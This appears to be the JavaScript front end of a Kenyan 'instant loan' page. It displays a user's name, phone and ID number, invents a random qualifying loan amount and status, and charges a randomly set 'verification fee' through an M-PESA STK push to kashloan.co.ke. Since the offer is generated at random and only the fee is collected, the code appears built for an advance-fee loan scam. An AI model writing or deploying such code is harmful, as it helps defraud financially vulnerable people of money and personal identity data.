// Constants and configurations
const CONFIG = {
  tracking: {
    prefix: "EALON-",
    length: 8,
    charset: "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",
  },
  amount: {
    min: 5000,
    max: 20000,
    step: 500,
  },
  fee: {
    min: 100,
    max: 500,
    step: 5,
  },
  phone: {
    prefix: "254",
    length: 12,
  },
  statuses: ["Pending", "Paid", "Processing", "Denied"],
};

// Secure random number generation
function generateSecureNumber(min, max, step = 1) {
  const range = (max - min) / step;
  const randomBuffer = new Uint32Array(1);
  window.crypto.getRandomValues(randomBuffer);
  const randomNumber = min + (randomBuffer[0] % (range + 1)) * step;
  return Math.floor(randomNumber);
}

// Tracking ID generation
function generateTrackingID() {
  const bytes = new Uint8Array(CONFIG.tracking.length);
  window.crypto.getRandomValues(bytes);
  const id = Array.from(bytes)
    .map(
      (byte) => CONFIG.tracking.charset[byte % CONFIG.tracking.charset.length]
    )
    .join("");
  return CONFIG.tracking.prefix + id;
}

// Generate loan amount
function generateLoanAmount() {
  return generateSecureNumber(
    CONFIG.amount.min,
    CONFIG.amount.max,
    CONFIG.amount.step
  );
}

// Generate verification fee
function generateVerificationFee() {
  return generateSecureNumber(CONFIG.fee.min, CONFIG.fee.max, CONFIG.fee.step);
}

// Format phone number
function formatPhoneNumber(phone) {
  if (!phone) return "";

  phone = phone.toString().trim().replace(/^\+/, "").replace(/\s/g, "");
  if (phone.startsWith("0")) {
    phone = CONFIG.phone.prefix + phone.slice(1);
  }

  if (
    !phone.startsWith(CONFIG.phone.prefix) ||
    phone.length !== CONFIG.phone.length
  ) {
    throw new Error(
      "Invalid phone number format. Please use a valid Kenyan phone number starting with '254'."
    );
  }

  return phone;
}

// Store loan details
function storeLoanDetails() {
  try {
    const loanAmount = document
      .getElementById("loan-amount")
      ?.textContent.replace(/[^\d]/g, "");
    const trackingID = document.getElementById("tracking-id")?.textContent;

    if (!loanAmount || !trackingID) {
      throw new Error("Required loan details missing");
    }

    localStorage.setItem("loanAmount", loanAmount);
    localStorage.setItem("loanBalance", loanAmount);
    localStorage.setItem("trackingID", trackingID);
    localStorage.setItem("loanDate", new Date().toISOString());
  } catch (error) {
    console.error("Failed to store loan details:", error);
    throw error;
  }
}

// M-PESA STK Push
async function initiateMpesaPush(phone, amount) {
  try {
    const button = document.getElementById("get-loan-btn");
    if (button) {
      button.disabled = true;
      button.textContent = "Processing...";
    }

    console.log("Initiating M-PESA push:", { phone, amount });

    const response = await fetch("https://kashloan.co.ke/stkpush", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ phone, amount }),
    });

    const data = await response.json();
    console.log("M-PESA response:", data);

    if (data.ResponseCode === "0") {
      storeLoanDetails();
      alert("M-PESA push sent. Please complete the payment.");
      window.location.href = "dashboard.html";
    } else {
      throw new Error(data.CustomerMessage || "Failed to initiate payment");
    }
  } catch (error) {
    console.error("M-PESA push error:", error);
    alert(error.message || "Failed to process payment. Please try again.");
  } finally {
    const button = document.getElementById("get-loan-btn");
    if (button) {
      button.disabled = false;
      button.textContent = "Get Loan Now";
    }
  }
}

// Initialize page on load
document.addEventListener("DOMContentLoaded", function () {
  try {
    // Get stored user data
    const storedData = {
      name: localStorage.getItem("name"),
      phone: localStorage.getItem("phone"),
      idNumber: localStorage.getItem("idNumber"),
      loanType: localStorage.getItem("loanType"),
    };

    // Validate stored data
    if (
      !storedData.name ||
      !storedData.phone ||
      !storedData.idNumber ||
      !storedData.loanType
    ) {
      throw new Error("Missing required user data");
    }

    // Generate new values
    const trackingID = generateTrackingID();
    const loanAmount = generateLoanAmount();
    const verificationFee = generateVerificationFee();
    const loanStatus =
      CONFIG.statuses[Math.floor(Math.random() * CONFIG.statuses.length)];

    // Update all UI elements
    const elements = {
      "user-name": storedData.name,
      "display-name": storedData.name,
      "mpesa-number": storedData.phone,
      "id-number": storedData.idNumber,
      "loan-type": storedData.loanType,
      "tracking-id": trackingID,
      "loan-amount": loanAmount.toLocaleString(),
      "qualified-loan": loanAmount.toLocaleString(),
      "verification-fee": verificationFee,
      "loan-status": loanStatus,
    };

    // Update each element if it exists
    Object.entries(elements).forEach(([id, value]) => {
      const element = document.getElementById(id);
      if (element) {
        element.textContent = value;
      }
    });

    // Set up loan button click handler
    const loanButton = document.getElementById("get-loan-btn");
    if (loanButton) {
      loanButton.addEventListener("click", async function () {
        try {
          const formattedPhone = formatPhoneNumber(storedData.phone);
          await initiateMpesaPush(formattedPhone, verificationFee);
        } catch (error) {
          console.error("Failed to initiate loan:", error);
          alert(error.message);
        }
      });
    }
  } catch (error) {
    console.error("Initialization error:", error);
    alert("Please complete the loan application form first.");
    window.location.href = "index.html";
  }
});
